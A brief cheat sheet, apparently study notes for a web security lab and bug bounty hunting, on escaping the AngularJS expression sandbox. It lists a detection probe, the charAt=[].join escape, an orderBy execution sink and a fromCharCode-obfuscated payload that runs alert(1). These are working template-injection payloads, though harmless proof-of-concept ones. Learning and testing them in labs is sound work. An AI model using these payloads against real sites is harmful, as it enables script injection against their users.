# AngularJS Sandbox Escape CheatSheet

## AngularJS Detection

```html
{{7*7}}
```

---

Expected Result

```text
49
```

---

# Classic Sandbox Escape

```javascript
'a'.constructor.prototype.charAt=[].join
```

---

# Why It Works

Breaks AngularJS internal:

```javascript
isIdent()
```

checks.

---

# orderBy Execution Sink

```javascript
[1]|orderBy:'alert(1)'
```

---

# Dynamic Payload Construction

```javascript
toString().constructor.fromCharCode()
```

---

Example

```javascript
toString().constructor.fromCharCode(
97,108,101,114,116
)
```

---

Produces:

```javascript
alert
```

---

# Lab24 Payload

```javascript
toString().constructor.prototype.charAt=[].join;
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

---

# Related Labs

```text
Lab24
```

---

# Bug Bounty Reminder

Whenever AngularJS exists:

```text
Look For
        ↓
orderBy
ng-init
ng-focus
ng-click
```